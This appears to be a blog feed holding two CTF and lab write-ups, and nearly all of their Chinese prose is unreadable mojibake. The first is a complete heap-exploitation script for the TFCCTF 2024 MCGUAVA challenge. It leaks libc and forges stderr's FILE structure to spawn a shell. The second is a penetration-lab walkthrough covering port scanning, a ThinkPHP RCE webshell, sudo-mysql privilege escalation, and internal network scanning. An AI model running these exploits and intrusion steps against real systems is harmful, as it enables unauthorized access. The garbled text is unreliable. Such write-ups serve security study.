class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">            env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿™ä¸¤ä¸ªå¾ªç¯ä¸ºå¤šä½™æ“ä½œï¼Œå½“æ—¶è„‘æŠ½å†™çš„ï¼Œåé¢æ‡’çš„åˆ äº†</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– fake 0x30 å’Œ unsorted_start å †å—çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– fake 0x20 å’Œ unsorted_end å †å—çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">    add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å– unsorted_middle çš„ç´¢å¼•</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">    add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¼ªé€  fake unsorted chunk ï¼ˆsizeã€fdã€bkï¼‰</span></span><br><span class="line">    add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">    add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">    free(<span class="number">29</span>)</span><br><span class="line">    free(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x30 å’Œ unsorted_start</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">    add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">    free(<span class="number">33</span>)</span><br><span class="line">    add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x20 å’Œ unsorted_end</span></span><br><span class="line">    free(<span class="number">24</span>)</span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">    add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">    add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">    free(<span class="number">37</span>)</span><br><span class="line">    add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">    free(<span class="number">39</span>) </span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">    free(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åœ¨åé¢å¡«å……å †å—ï¼Œå¹¶ä¼ªé€  prev_size å’Œ size ä½¿ fake unsorted chunk åˆæ³•</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br><span class="line">    <span class="comment"># æå‰è®© 0x240ã€0x250 ä¸¤ä¸ªå¤§å°çš„å †å—è¿›å…¥åˆ° tcacheï¼Œåé¢ä¼šç”¨ä¸Š</span></span><br><span class="line">    add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">    add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">    free(<span class="number">78</span>)</span><br><span class="line">    free(<span class="number">79</span>)</span><br><span class="line">    <span class="comment"># ä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start</span></span><br><span class="line">    free(<span class="number">25</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»¤ unsorted_start çš„ fd æŒ‡é’ˆå’Œ unsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk</span></span><br><span class="line">    add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">    free(<span class="number">80</span>)</span><br><span class="line">    add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">    free(<span class="number">81</span>)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        add(<span class="number">0x500</span>) <span class="comment"># 82</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†å¤šä½™çš„ largebin ç”³è¯·å‡ºæ¥</span></span><br><span class="line">    add(<span class="number">0x500</span>) <span class="comment"># 83</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿®æ”¹</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 84</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) <span class="comment"># 85</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>) <span class="comment"># 86</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(libc_base)[<span class="number">2</span>] != <span class="string">&#x27;7&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(libc_base)[<span class="number">3</span>] != <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é‡Šæ”¾ tcache_perthread_struct ä¸Šçš„å †å—ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿå†æ¬¡ç¼–è¾‘è¯¥ç»“æ„ä½“</span></span><br><span class="line">    free(<span class="number">86</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä»¤ size ä¸º 0x250 çš„ tcache æŒ‡å‘ _IO_2_1_stderr_</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) <span class="comment"># 87</span></span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">        <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># åœ¨ _IO_2_1_stderr_ ä¸Šå†™ä¸Šæˆ‘ä»¬çš„ fake file</span></span><br><span class="line">    add(<span class="number">0x240</span>,<span class="number">0</span>,fake_file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é€€å‡ºç¨‹åºï¼Œæ‰§è¡Œ fsop æ”»å‡»</span></span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç”±äºéœ€è¦åˆ†åˆ«åœ¨ heapbase å’Œ stdout ä¸Šè¿›è¡Œä¸€æ¬¡çˆ†ç ´ï¼Œæ‰€ä»¥è„šæœ¬æ‰§è¡Œçš„æˆåŠŸç‡ä¸º 1&#x2F;256ï¼Œè¿è¡Œåè¿˜è¦ç­‰åŠå¤©</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/18.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>æ‰“é€šï¼Œå®Œç»“æ•£èŠ±ğŸ‚ğŸº</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒInitialè¯¦è§£</title>
      <link href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h1 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h1><p>ä¸€ç›´éƒ½çŸ¥é“æ¸—é€åœ¨ç½‘ç»œå®‰å…¨ä¸­çš„é‡è¦æ€§ï¼Œå¯æ˜¯ä¸€ç›´éƒ½æ²¡ç”¨é‡è§†ï¼Œäºæ˜¯åœ¨å›½èµ›å†³èµ›åƒå¤§äºã€‚å¹³æ—¶è‡ªå·±ä¹Ÿåœ¨æ‰“æ‰“ <code>vulnhub</code>ï¼Œä½†æ‰“çš„éƒ½æ˜¯ä¸€äº›ååˆ†ç®€å•çš„é¶åœºã€‚å›½èµ›å†³èµ›ç»“æŸåæˆ‘å°±å¼€å§‹pushæ ¡é˜Ÿçš„äººå»å­¦ä¹ æ¸—é€ï¼Œå½“ç„¶æˆ‘è¿™ä¸ªæ–°ä¸Šä»»çš„é˜Ÿé•¿è‚¯å®šè¦èµ·åˆ°å¸¦å¤´ä½œç”¨ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå¼€å§‹å»ç»ƒä¹ æ˜¥ç§‹äº‘å¢ƒçš„é¶åœºã€‚å¾ˆå¤šäººè®¤ä¸ºäº‘å¢ƒè¿™ä¸ªé¶åœºæ¯”è¾ƒè´µï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºèƒ½å¤Ÿç”¨é’±ä¹°çŸ¥è¯†æ˜¯ä¸€ä»¶å¾ˆåˆ’ç®—çš„äº‹æƒ…ï¼Œè€Œä¸”æ˜¥ç§‹äº‘å¢ƒçš„é¶åœºè´¨é‡ä¹Ÿæ¯”è¾ƒé«˜ï¼ˆè¿˜æœ‰å›½èµ›æ¸—é€ä¹Ÿæœ‰å¾ˆå¤šå†…å®¹æ¥è‡ªè¿™é‡Œé¢ï¼‰<br>è¿™ç¯‡æ–‡ç« æ˜¯å…³äº <code>Initial</code> è¿™ä¸ªé¶æœºçš„è¯¦ç»†è®²è§£ï¼Œè¿™ä¸ªæ˜¯äº‘å¢ƒä¸­æœ€ç®€å•çš„ä¸€é¢˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æˆ‘æ‰“çš„ç¬¬ä¸€ä¸ªå…³äº <code>windows</code> æ¸—é€çš„é¢˜ç›®ï¼Œå› æ­¤å­¦åˆ°äº†å¾ˆå¤šçš„ä¸œè¥¿ã€‚</p><h1 id="è¯¦ç»†è®²è§£"><a href="#è¯¦ç»†è®²è§£" class="headerlink" title="è¯¦ç»†è®²è§£"></a>è¯¦ç»†è®²è§£</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªipåœ°å€ <code>39.99.255.153</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>nmap</code> æ¥çœ‹çœ‹ä»–å¼€å¯äº†é‚£äº›ç«¯å£ï¼Œå‘½ä»¤ä¸ºï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 39.99.255.153</span><br></pre></td></tr></table></figure><p>è¿™æ®µå‘½ä»¤æ˜¯ä»¥æœ€å°é€Ÿç‡ <code>10000</code> å¯¹å…¨éƒ¨ç«¯å£ï¼ˆ1-65535ï¼‰è¿›è¡Œæ‰«æï¼Œ<code>10000</code> æ˜¯æƒè¡¡çš„ç»“æœï¼Œæ•°å­—è¿‡å¤§æ‰«æé€Ÿåº¦å¿«ï¼Œä½†å®¹æ˜“é—æ¼ç«¯å£ï¼Œæ•°å­—è¿‡å°åˆ™æ‰«ææ—¶é—´è¿‡é•¿ï¼Œç»éªŒè¡¨æ˜ <code>10000</code> å°±æ˜¯æ‰«æçš„åˆé€‚é€Ÿåº¦ã€‚<code>-p</code> æ˜¯ç«¯å£å‚æ•°ï¼Œ<code>-p-</code> è¡¨ç¤ºå¯¹æ‰€æœ‰ç«¯å£è¿›è¡Œæ‰«æã€‚æ‰«æç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°å¼€å¯äº† <code>22</code>ã€<code>80</code> ç«¯å£ï¼Œ<code>22</code> ç«¯å£æ˜¯ä¸€ä¸ª <code>ssh</code> æœåŠ¡ï¼Œ<code>80</code> ç«¯å£æ˜¯ä¸€ä¸ª <code>http</code> æœåŠ¡ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹è¿™ä¸ªå‡ ä¸ªç«¯å£å¼€å¯çš„æœåŠ¡å’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap â€“sT â€“sV -O â€“p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>-sT</code> è¡¨ç¤ºè¿›è¡Œ <code>TCP</code> æ‰«æï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ï¼Œ<code>-p</code> è¡¨ç¤ºå¾…æ‰«æçš„ç«¯å£ï¼ˆåè·Ÿå¾…æ‰«æçš„ç«¯å£ <code>22</code>ã€<code>80</code>ï¼‰ï¼Œ<code>-sV</code> è¡¨ç¤ºæ¢æµ‹å¼€æ”¾æœåŠ¡çš„ç‰ˆæœ¬ï¼Œ<code>-O</code> è¡¨ç¤ºæ¢æµ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œæ‰«æç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªipæ˜¯ä¸€å° <code>ubuntu linux</code> æœåŠ¡å™¨ï¼Œå¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæƒ³åˆ°è¿˜æœ‰ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æ‰«æå·¥å…· <code>fscan</code>ï¼Œå·¥å…·çš„ä¸‹è½½åœ°å€ä¸ºï¼š<br><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚ (github.com)</a><br>è¿™ä¸ªå·¥å…·æœ‰linuxå’Œwindowsç‰ˆæœ¬ï¼Œå…¶å…·ä½“ç”¨æ³•å¯ä»¥çœ‹å®˜æ–¹çš„æ–‡æ¡£ï¼Œè¿™é‡Œåªç”¨äºè¿›è¡Œç®€å•çš„ç«¯å£æ‰«æï¼Œè¾“å…¥ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">255.153</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ° <code>web server</code> çš„ç‰ˆæœ¬æ˜¯ <code>ThinkPHP 5.0.23</code>ï¼Œè€Œä¸”å­˜åœ¨æ¼æ´ï¼ï¼ï¼<br>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨<code>nmap</code>å‘½ä»¤æ¥è¿›è¡Œæ¼æ´æ‰«æï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ <code>ThinkphpGUI</code> è¿™ä¸ªå¼€æºå·¥å…·æ¥è¿›è¡Œæ‰«ä¸€ä¸‹ï¼Œå·¥å…·é“¾æ¥ä¸ºï¼š<br><a href="https://github.com/Lotus6/ThinkphpGUI">Lotus6&#x2F;ThinkphpGUI: Thinkphp(GUI)æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒå„ç‰ˆæœ¬TPæ¼æ´æ£€æµ‹ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œgetshellã€‚ (github.com)</a><br>è¾“å…¥ <code>url</code> å’Œé€‰æ‹©ç‰ˆæœ¬åç‚¹å‡»æ£€æµ‹å’Œ <code>GetShell</code> å³å¯ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥åˆ°ç½‘é¡µå­˜åœ¨ä¸€ä¸ªåé—¨ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„ <code>poc</code>ï¼Œæˆ‘ä»¬åˆ©ç”¨ä»–ç»™çš„ <code>poc</code> æ¥å†™å…¥ <code>shell.php</code> åé—¨</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆå›æ˜¾ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥ä½¿ç”¨èšå‰‘æ¥è¿ä»–è‡ªå¸¦çš„åé—¨ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆåŠŸè¿æ¥ï¼Œè€Œä¸”æˆ‘ä»¬èƒ½çœ‹è§å½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ª <code>shell.php</code> æ–‡ä»¶</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç‚¹å¼€å¯ä»¥å‘ç°å…¶å°±æ˜¯æˆ‘ä»¬åˆ©ç”¨ <code>poc</code> ä¸Šä¼ çš„åé—¨ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œèƒ½è¿›æ¥å°±è¡Œï¼Œæ¥ä¸‹æ¥å°±æ˜¯éœ€è¦æå–ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è‡ªå·±æ˜¯ä»€ä¹ˆæƒé™ï¼š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§æ˜¯ <code>www-data</code> æƒé™ï¼Œå¯æ˜¯è¾“å…¥ <code>sudo -l</code> æ—¶å›æ˜¾</p><blockquote><p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;mysql</p></blockquote><p>è¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡é€šè¿‡ <code>sudo</code> é«˜æƒé™è¿è¡Œ <code>mysql</code>ï¼Œè¿›è€Œèƒ½å¤Ÿæ‰§è¡Œ <code>root</code>æƒ é™æ‰èƒ½æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œé‡Œé¢ä¹Ÿæœ‰è®²å¾ˆå¤šç§æå–çš„æ–¹æ³•<br><a href="https://blog.csdn.net/Bossfrank/article/details/132035121">æ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢</a></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>äºæ˜¯æˆ‘ä»¬å°±èƒ½å¾ˆå®¹æ˜“çš„è·å–åˆ° <code>flag1</code>ï¼Œå¯ä»¥å‘ç° <code>flag1</code> åœ¨ <code>/root/flag</code> ç›®å½•ä¸‹</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>æ¥ä¸‹æ¥å°±æ˜¯è¦è€ƒè™‘å†…ç½‘æ¨ªå‘ç§»åŠ¨ï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯è·å–åŸŸæ§ä¸Šçš„ <code>flag</code>ï¼Œæˆ‘ä»¬å…ˆç”¨èšå‰‘ä¸Šä¼  <code>fscan</code>ï¼Œæ‰«æä¸€ä¸‹å†…ç½‘ä¸­æœ‰é‚£äº›å­˜æ´»æœºå™¨</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é‡Œè¦è®°å¾—ç»™ <code>fscan</code> æ‰§è¡Œæƒé™ï¼Œå¦åˆ™ä¼šæ‰§è¡Œä¸äº†<br>é€šè¿‡ <code>ip a</code> æˆ‘ä»¬å¯ä»¥å‘ç°ç½‘æ®µä¸º <code>172.22.1.0/24</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰«æçš„ç»“æœä¼šè‡ªåŠ¨å­˜åœ¨å½“å‰ç›®å½•çš„ <code>result.txt</code> æ–‡ä»¶ä¸Š</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>äºæ˜¯æˆ‘ä»¬æœé›†åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><blockquote><p>172.22.1.2:DCåŸŸæ§<br>172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´<br>172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ</p></blockquote><p>è€Œæˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡å³ä¸º <code>DC</code> åŸŸæ§<br>æˆ‘ä»¬æœå…ˆæ˜¯å¯¹ <code>OA</code> 